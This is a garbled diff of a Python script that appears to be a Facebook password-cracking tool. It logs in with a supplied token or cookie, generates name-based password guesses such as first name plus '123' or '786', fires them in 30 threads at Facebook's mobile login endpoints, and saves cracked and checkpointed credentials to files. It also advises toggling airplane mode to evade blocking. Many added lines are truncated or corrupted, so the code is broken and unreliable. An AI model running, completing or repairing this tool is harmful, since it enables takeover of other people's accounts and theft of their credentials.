@@ -57,24 +57,7 @@ ok = []
 try:
 	os.mkdir('/sdcard/')
 except:pass
-x = '\33[m' 
-k = '\033[93m' 
-h = '\x1b[1;92m' 
-hh = '\033[32m' 
-u = '\033[95m' 
-K = '\033[95m' 
-kk = '\033[33m' 
-b = '\33[1;96m' 
-p = '\x1b[0;34m' 
-dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'Agustus','9':'September','10':'October','11':'November','12':'December'}
-dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'Agustus','09':'September','10':'October','11':'November','12':'December'}
-tgl = datetime.datetime.now().day
-bln = dic[(str(datetime.datetime.now().month))]
-thn = datetime.datetime.now().year
-okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
-cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
-def clear():
-	os.system('clear')
+x = '
 def back():
 	login()
 
@@ -104,49 +87,7 @@ def login():
 			exit()
 	except IOError:
 		Public()
-def jalan(z):
-	for e in z + '\n':
-		sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
-
-def Public():
-	clear()
-	print(logo)
-	print  (' [01] Login With Token\n [02] Login With Cookie')
-	pil=input('\n [#] Select One : ')
-	if pil in ['1','01']:
-		panda = input(' [+] Token : ')
-		akun=open('.token.txt','w').write(panda)
-		try:
-			tes = requests.get('https://m.facebook.com/me?access_token='+panda)
-			tes3 = json.loads(tes.text)['id']
-			print (" [] Login Successful")
-			login()
-		except KeyError:
-			print( ' [×] Login Failed ')
-			time.sleep(2.5)
-			Public()
-		except requests.exceptions.ConnectionError:
-			print ( ' [×] Connection Timeout')
-			exit()
-	elif pil in ['2','02']:
-		try:
-			cookie=input(" [+] Cookie : ")
-			data = requests.get("https://m.facebook.com/m._locations", headers = {
-    'authority': 'mbasic.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    # 'cookie': 'datr=tE3HZNm1XKtz5P8QdmUc9j8K; sb=tE3HZEITxw114Q72CGKeybuJ',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.57"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"10.0.0"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
+def     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
     'viewport-width': '980',},cookies = {"cookie":cookie}) 
@@ -225,8 +166,7 @@ def setting():
 	passmenu()
 def passmenu():
 	clear()
-	print(logo);print  ('\n [01] First name digit pass \n [02] All Name Password \n [03] All Name+ password')
-	passmen=input('\n [#] Select Pass : ')
+	print(logo);print  ('\n [01] First name digit pass \n [02] All Name Password \n [03] All Name+ passwomen=input('\n [#] Select Pass : ')
 	if passmen in ['1','01']:
 		first()
 	elif passmen in ['2','02']:
@@ -249,14 +189,11 @@ def first():
 					pass
 				else:
 					pwv.append(frs+'123')
-					pwv.append(frs+'12345')
-			else:
-				if len(frs)<3:
-					pwv.append(nmf)
+					pwv.append(frs+'123
 				else:
 					pwv.append(nmf)
 					pwv.append(frs+'123')
-					pwv.append(frs+'12345')
+					pwv.app(frs+'12345')
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
 			elif 'free' in method:
@@ -278,20 +215,18 @@ def name():
 				if 'mobile' in method:
 					pool.submit(crack,idf,pwv)
 				elif 'free' in method:
-					pool.submit(free,idf,pwv)
-				else:
+					pool.submit(free,idf,pwv)e:
 					pool.submit(crack,idf,pwv)
-			except:
-				pass
+		ss
 def name2():
 	clear()
-	print(logo);print( '\n [] OK Result Saved To : \033[1;92mOK/%s\033[1;97m\n [] CP Result Saved To : \033[1;91mCP/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
+	print(logo);print( '\n [] OK Resed To : \033[1;92mOK/%s\033[1;97m\n [] CP Result Saved To : \033[1;91mCP/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
 			pwv = ['445566']
-			if len(nmf)<6:
+	<6:
 				if len(frs)<3:
 					pass
 				else:
@@ -305,7 +240,7 @@ def name2():
 					pwv.append(frs+'123')
 					pwv.append(frs+'12345')
 					pwv.append(frs+'1234')
-					pwv.append(frs+'786')
+wv.append(frs+'786')
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
 			elif 'free' in method:
@@ -344,8 +279,7 @@ def crack(idf,pwv):
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
     'viewport-width': '980',
-})
-			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
+	} ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
 			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://m.facebook.com/login/save-device/'"}
 			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
@@ -354,11 +288,11 @@ def crack(idf,pwv):
 				print( f'\r\x1b[1;91m [ AYEZOO-CP ] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
-				break
+				b
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ AYEZOO-OK ] {idf} | {pw}')
+				prm [ AYEZOO-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
 				open('/sdcard/ids/ok.txt','a').write('%s\n' % wrt)
@@ -367,7 +301,7 @@ def crack(idf,pwv):
 
 			else:
 				continue
-		except requests.exceptions.ConnectionError:
+	exce s.exceptions.ConnectionError:
 			time.sleep(31)
 	loop+=1
 def free(idf,pwv):
